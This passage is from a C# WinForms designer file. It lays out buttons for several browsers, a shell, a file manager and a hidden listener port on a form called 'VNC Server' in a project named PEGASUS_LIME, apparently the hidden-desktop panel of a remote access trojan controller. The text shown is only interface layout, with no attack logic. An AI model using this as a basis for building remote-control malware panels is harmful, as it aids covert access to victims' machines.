			btnComodo.CheckedState.BorderColor = System.Drawing.Color.White;
			btnComodo.CheckedState.FillColor = System.Drawing.Color.Black;
			btnComodo.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.CheckedState.Parent = btnComodo;
			btnComodo.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.CustomImages.Parent = btnComodo;
			btnComodo.DisabledState.BorderColor = System.Drawing.Color.White;
			btnComodo.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnComodo.DisabledState.FillColor = System.Drawing.Color.Black;
			btnComodo.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnComodo.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnComodo.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.DisabledState.Parent = btnComodo;
			btnComodo.FillColor = System.Drawing.Color.Black;
			btnComodo.FillColor2 = System.Drawing.Color.Black;
			btnComodo.Font = new System.Drawing.Font("Electrolize", 9f);
			btnComodo.ForeColor = System.Drawing.Color.White;
			btnComodo.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnComodo.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnComodo.HoverState.FillColor = System.Drawing.Color.Black;
			btnComodo.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnComodo.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.HoverState.Parent = btnComodo;
			btnComodo.Location = new System.Drawing.Point(1040, 230);
			btnComodo.Name = "btnComodo";
			btnComodo.ShadowDecoration.Parent = btnComodo;
			btnComodo.Size = new System.Drawing.Size(123, 27);
			btnComodo.TabIndex = 260;
			btnComodo.Text = "Comodo";
			btnComodo.Click += new System.EventHandler(btnComodo_Click);
			btnWaterfox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnWaterfox.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.BorderThickness = 1;
			btnWaterfox.CheckedState.BorderColor = System.Drawing.Color.White;
			btnWaterfox.CheckedState.FillColor = System.Drawing.Color.Black;
			btnWaterfox.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.CheckedState.Parent = btnWaterfox;
			btnWaterfox.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.CustomImages.Parent = btnWaterfox;
			btnWaterfox.DisabledState.BorderColor = System.Drawing.Color.White;
			btnWaterfox.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnWaterfox.DisabledState.FillColor = System.Drawing.Color.Black;
			btnWaterfox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnWaterfox.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnWaterfox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.DisabledState.Parent = btnWaterfox;
			btnWaterfox.FillColor = System.Drawing.Color.Black;
			btnWaterfox.FillColor2 = System.Drawing.Color.Black;
			btnWaterfox.Font = new System.Drawing.Font("Electrolize", 9f);
			btnWaterfox.ForeColor = System.Drawing.Color.White;
			btnWaterfox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnWaterfox.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnWaterfox.HoverState.FillColor = System.Drawing.Color.Black;
			btnWaterfox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnWaterfox.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnWaterfox.HoverState.Parent = btnWaterfox;
			btnWaterfox.Location = new System.Drawing.Point(1040, 263);
			btnWaterfox.Name = "btnWaterfox";
			btnWaterfox.ShadowDecoration.Parent = btnWaterfox;
			btnWaterfox.Size = new System.Drawing.Size(123, 27);
			btnWaterfox.TabIndex = 259;
			btnWaterfox.Text = "Waterfox";
			btnWaterfox.Click += new System.EventHandler(btnWaterfox_Click);
			btnPalemoon.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnPalemoon.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.BorderThickness = 1;
			btnPalemoon.CheckedState.BorderColor = System.Drawing.Color.White;
			btnPalemoon.CheckedState.FillColor = System.Drawing.Color.Black;
			btnPalemoon.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.CheckedState.Parent = btnPalemoon;
			btnPalemoon.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.CustomImages.Parent = btnPalemoon;
			btnPalemoon.DisabledState.BorderColor = System.Drawing.Color.White;
			btnPalemoon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnPalemoon.DisabledState.FillColor = System.Drawing.Color.Black;
			btnPalemoon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnPalemoon.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.DisabledState.Parent = btnPalemoon;
			btnPalemoon.FillColor = System.Drawing.Color.Black;
			btnPalemoon.FillColor2 = System.Drawing.Color.Black;
			btnPalemoon.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPalemoon.ForeColor = System.Drawing.Color.White;
			btnPalemoon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPalemoon.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnPalemoon.HoverState.FillColor = System.Drawing.Color.Black;
			btnPalemoon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPalemoon.HoverState.Parent = btnPalemoon;
			btnPalemoon.Location = new System.Drawing.Point(1040, 296);
			btnPalemoon.Name = "btnPalemoon";
			btnPalemoon.ShadowDecoration.Parent = btnPalemoon;
			btnPalemoon.Size = new System.Drawing.Size(123, 27);
			btnPalemoon.TabIndex = 158;
			btnPalemoon.Text = "PaleMoon";
			btnPalemoon.Click += new System.EventHandler(btnPalemoon_Click);
			btnIE.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnIE.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.BorderThickness = 1;
			btnIE.CheckedState.BorderColor = System.Drawing.Color.White;
			btnIE.CheckedState.FillColor = System.Drawing.Color.Black;
			btnIE.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.CheckedState.Parent = btnIE;
			btnIE.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.CustomImages.Parent = btnIE;
			btnIE.DisabledState.BorderColor = System.Drawing.Color.White;
			btnIE.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnIE.DisabledState.FillColor = System.Drawing.Color.Black;
			btnIE.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnIE.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnIE.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.DisabledState.Parent = btnIE;
			btnIE.FillColor = System.Drawing.Color.Black;
			btnIE.FillColor2 = System.Drawing.Color.Black;
			btnIE.Font = new System.Drawing.Font("Electrolize", 9f);
			btnIE.ForeColor = System.Drawing.Color.White;
			btnIE.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnIE.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnIE.HoverState.FillColor = System.Drawing.Color.Black;
			btnIE.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnIE.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnIE.HoverState.Parent = btnIE;
			btnIE.Location = new System.Drawing.Point(1040, 395);
			btnIE.Name = "btnIE";
			btnIE.ShadowDecoration.Parent = btnIE;
			btnIE.Size = new System.Drawing.Size(123, 27);
			btnIE.TabIndex = 272;
			btnIE.Text = "IExplorer";
			btnIE.Click += new System.EventHandler(btnIexplore_Click);
			btnOpera.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnOpera.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.BorderThickness = 1;
			btnOpera.CheckedState.BorderColor = System.Drawing.Color.White;
			btnOpera.CheckedState.FillColor = System.Drawing.Color.Black;
			btnOpera.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.CheckedState.Parent = btnOpera;
			btnOpera.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.CustomImages.Parent = btnOpera;
			btnOpera.DisabledState.BorderColor = System.Drawing.Color.White;
			btnOpera.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnOpera.DisabledState.FillColor = System.Drawing.Color.Black;
			btnOpera.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOpera.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnOpera.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.DisabledState.Parent = btnOpera;
			btnOpera.FillColor = System.Drawing.Color.Black;
			btnOpera.FillColor2 = System.Drawing.Color.Black;
			btnOpera.Font = new System.Drawing.Font("Electrolize", 9f);
			btnOpera.ForeColor = System.Drawing.Color.White;
			btnOpera.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnOpera.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnOpera.HoverState.FillColor = System.Drawing.Color.Black;
			btnOpera.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOpera.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOpera.HoverState.Parent = btnOpera;
			btnOpera.Location = new System.Drawing.Point(1040, 329);
			btnOpera.Name = "btnOpera";
			btnOpera.ShadowDecoration.Parent = btnOpera;
			btnOpera.Size = new System.Drawing.Size(123, 27);
			btnOpera.TabIndex = 261;
			btnOpera.Text = "Opera";
			btnOpera.Click += new System.EventHandler(btnOpera_Click);
			btnOperaNeon.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnOperaNeon.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.BorderThickness = 1;
			btnOperaNeon.CheckedState.BorderColor = System.Drawing.Color.White;
			btnOperaNeon.CheckedState.FillColor = System.Drawing.Color.Black;
			btnOperaNeon.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.CheckedState.Parent = btnOperaNeon;
			btnOperaNeon.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.CustomImages.Parent = btnOperaNeon;
			btnOperaNeon.DisabledState.BorderColor = System.Drawing.Color.White;
			btnOperaNeon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnOperaNeon.DisabledState.FillColor = System.Drawing.Color.Black;
			btnOperaNeon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOperaNeon.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnOperaNeon.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.DisabledState.Parent = btnOperaNeon;
			btnOperaNeon.FillColor = System.Drawing.Color.Black;
			btnOperaNeon.FillColor2 = System.Drawing.Color.Black;
			btnOperaNeon.Font = new System.Drawing.Font("Electrolize", 9f);
			btnOperaNeon.ForeColor = System.Drawing.Color.White;
			btnOperaNeon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnOperaNeon.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnOperaNeon.HoverState.FillColor = System.Drawing.Color.Black;
			btnOperaNeon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnOperaNeon.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnOperaNeon.HoverState.Parent = btnOperaNeon;
			btnOperaNeon.Location = new System.Drawing.Point(1040, 362);
			btnOperaNeon.Name = "btnOperaNeon";
			btnOperaNeon.ShadowDecoration.Parent = btnOperaNeon;
			btnOperaNeon.Size = new System.Drawing.Size(123, 27);
			btnOperaNeon.TabIndex = 271;
			btnOperaNeon.Text = "O Neon";
			btnOperaNeon.Click += new System.EventHandler(btnOperaNeon_Click);
			btnPowershell.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			btnPowershell.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.BorderThickness = 1;
			btnPowershell.CheckedState.BorderColor = System.Drawing.Color.White;
			btnPowershell.CheckedState.FillColor = System.Drawing.Color.Black;
			btnPowershell.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.CheckedState.Parent = btnPowershell;
			btnPowershell.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.CustomImages.Parent = btnPowershell;
			btnPowershell.DisabledState.BorderColor = System.Drawing.Color.White;
			btnPowershell.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnPowershell.DisabledState.FillColor = System.Drawing.Color.Black;
			btnPowershell.DisabledState.FillColor2 = System.Drawing.Color.Black;
			btnPowershell.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.DisabledState.Parent = btnPowershell;
			btnPowershell.FillColor = System.Drawing.Color.Black;
			btnPowershell.FillColor2 = System.Drawing.Color.Black;
			btnPowershell.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPowershell.ForeColor = System.Drawing.Color.White;
			btnPowershell.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPowershell.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnPowershell.HoverState.FillColor = System.Drawing.Color.Black;
			btnPowershell.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPowershell.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnPowershell.HoverState.Parent = btnPowershell;
			btnPowershell.Location = new System.Drawing.Point(1040, 626);
			btnPowershell.Name = "btnPowershell";
			btnPowershell.ShadowDecoration.Parent = btnPowershell;
			btnPowershell.Size = new System.Drawing.Size(123, 27);
			btnPowershell.TabIndex = 160;
			btnPowershell.Text = "Shell";
			btnPowershell.Click += new System.EventHandler(btnPowershell_Click);
			guna2GradientButton5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.BorderThickness = 1;
			guna2GradientButton5.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2GradientButton5.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton5.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.CheckedState.Parent = guna2GradientButton5;
			guna2GradientButton5.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.CustomImages.Parent = guna2GradientButton5;
			guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.DisabledState.Parent = guna2GradientButton5;
			guna2GradientButton5.FillColor = System.Drawing.Color.Black;
			guna2GradientButton5.FillColor2 = System.Drawing.Color.Black;
			guna2GradientButton5.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton5.ForeColor = System.Drawing.Color.White;
			guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton5.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			guna2GradientButton5.HoverState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton5.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton5.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton5.HoverState.Parent = guna2GradientButton5;
			guna2GradientButton5.Location = new System.Drawing.Point(1040, 659);
			guna2GradientButton5.Name = "guna2GradientButton5";
			guna2GradientButton5.ShadowDecoration.Parent = guna2GradientButton5;
			guna2GradientButton5.Size = new System.Drawing.Size(123, 27);
			guna2GradientButton5.TabIndex = 156;
			guna2GradientButton5.Text = "File Manager";
			guna2GradientButton5.Click += new System.EventHandler(btnExplorer_Click);
			guna2GradientButton4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.BorderThickness = 1;
			guna2GradientButton4.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2GradientButton4.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton4.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.CheckedState.Parent = guna2GradientButton4;
			guna2GradientButton4.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.CustomImages.Parent = guna2GradientButton4;
			guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.DisabledState.Parent = guna2GradientButton4;
			guna2GradientButton4.FillColor = System.Drawing.Color.Black;
			guna2GradientButton4.FillColor2 = System.Drawing.Color.Black;
			guna2GradientButton4.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton4.ForeColor = System.Drawing.Color.White;
			guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.Black;
			guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton4.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2GradientButton4.HoverState.Parent = guna2GradientButton4;
			guna2GradientButton4.Location = new System.Drawing.Point(1040, 593);
			guna2GradientButton4.Name = "guna2GradientButton4";
			guna2GradientButton4.ShadowDecoration.Parent = guna2GradientButton4;
			guna2GradientButton4.Size = new System.Drawing.Size(123, 27);
			guna2GradientButton4.TabIndex = 157;
			guna2GradientButton4.Text = "Run";
			guna2GradientButton4.Click += new System.EventHandler(btnRun_Click);
			bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator1.Location = new System.Drawing.Point(1033, 435);
			bunifuSeparator1.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator1.Name = "bunifuSeparator1";
			bunifuSeparator1.Size = new System.Drawing.Size(10, 149);
			bunifuSeparator1.TabIndex = 258;
			bunifuSeparator3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator3.Location = new System.Drawing.Point(1158, 434);
			bunifuSeparator3.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator3.Name = "bunifuSeparator3";
			bunifuSeparator3.Size = new System.Drawing.Size(10, 149);
			bunifuSeparator3.TabIndex = 257;
			pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			pictureBox2.Image = PEGASUS_LIME.Properties.Resources.pegamatrix;
			pictureBox2.Location = new System.Drawing.Point(1031, 475);
			pictureBox2.Name = "pictureBox2";
			pictureBox2.Size = new System.Drawing.Size(140, 62);
			pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox2.TabIndex = 273;
			pictureBox2.TabStop = false;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			guna2ResizeForm1.TargetForm = this;
			ListenPort.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			ListenPort.BackColor = System.Drawing.Color.Transparent;
			ListenPort.BorderColor = System.Drawing.Color.Black;
			ListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
			ListenPort.DisabledState.BorderColor = System.Drawing.Color.Black;
			ListenPort.DisabledState.FillColor = System.Drawing.Color.Black;
			ListenPort.DisabledState.ForeColor = System.Drawing.Color.White;
			ListenPort.DisabledState.Parent = ListenPort;
			ListenPort.FillColor = System.Drawing.Color.Black;
			ListenPort.FocusedState.BorderColor = System.Drawing.Color.Black;
			ListenPort.FocusedState.FillColor = System.Drawing.Color.Black;
			ListenPort.FocusedState.ForeColor = System.Drawing.Color.White;
			ListenPort.FocusedState.Parent = ListenPort;
			ListenPort.Font = new System.Drawing.Font("Electrolize", 9f);
			ListenPort.ForeColor = System.Drawing.Color.Black;
			ListenPort.Location = new System.Drawing.Point(265, 28);
			ListenPort.Maximum = new decimal(new int[4] { 65553, 0, 0, 0 });
			ListenPort.Minimum = new decimal(new int[4] { 1025, 0, 0, 0 });
			ListenPort.Name = "ListenPort";
			ListenPort.ShadowDecoration.Parent = ListenPort;
			ListenPort.Size = new System.Drawing.Size(90, 25);
			ListenPort.TabIndex = 281;
			ListenPort.UpDownButtonFillColor = System.Drawing.Color.Black;
			ListenPort.Value = new decimal(new int[4] { 4447, 0, 0, 0 });
			ListenPort.Visible = false;
			label12.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label12.AutoSize = true;
			label12.BackColor = System.Drawing.Color.Transparent;
			label12.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label12.Location = new System.Drawing.Point(357, -145);
			label12.Name = "label12";
			label12.Size = new System.Drawing.Size(58, 15);
			label12.TabIndex = 279;
			label12.Text = "Listener :";
			label12.Visible = false;
			StartPort.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			StartPort.BackColor = System.Drawing.Color.Transparent;
			StartPort.CheckedState.BorderColor = System.Drawing.Color.DimGray;
			StartPort.CheckedState.BorderRadius = 2;
			StartPort.CheckedState.BorderThickness = 1;
			StartPort.CheckedState.FillColor = System.Drawing.Color.Black;
			StartPort.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			StartPort.CheckedState.InnerBorderRadius = 2;
			StartPort.CheckedState.InnerColor = System.Drawing.Color.FromArgb(9, 248, 121);
			StartPort.CheckedState.Parent = StartPort;
			StartPort.Location = new System.Drawing.Point(421, -148);
			StartPort.Name = "StartPort";
			StartPort.ShadowDecoration.Parent = StartPort;
			StartPort.Size = new System.Drawing.Size(55, 20);
			StartPort.TabIndex = 278;
			StartPort.UncheckedState.BorderColor = System.Drawing.Color.DimGray;
			StartPort.UncheckedState.BorderRadius = 2;
			StartPort.UncheckedState.BorderThickness = 1;
			StartPort.UncheckedState.FillColor = System.Drawing.Color.Black;
			StartPort.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			StartPort.UncheckedState.InnerBorderRadius = 2;
			StartPort.UncheckedState.InnerColor = System.Drawing.Color.White;
			StartPort.UncheckedState.Parent = StartPort;
			StartPort.Visible = false;
			StartPort.CheckedChanged += new System.EventHandler(StartPort_CheckedChanged);
			label13.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			label13.AutoSize = true;
			label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label13.ForeColor = System.Drawing.Color.White;
			label13.Location = new System.Drawing.Point(250, 28);
			label13.Name = "label13";
			label13.Size = new System.Drawing.Size(244, 20);
			label13.TabIndex = 280;
			label13.Text = "[                                             ]";
			label13.Visible = false;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(1185, 713);
			base.Controls.Add(label12);
			base.Controls.Add(StartPort);
			base.Controls.Add(panel1);
			base.Controls.Add(ListenPort);
			base.Controls.Add(label13);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			MinimumSize = new System.Drawing.Size(1185, 713);
			base.Name = "VNCForm";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "VNC Server";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(VNCForm_FormClosed);
			base.Load += new System.EventHandler(VNCForm_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCForm_MouseDown);
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)ListenPort).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
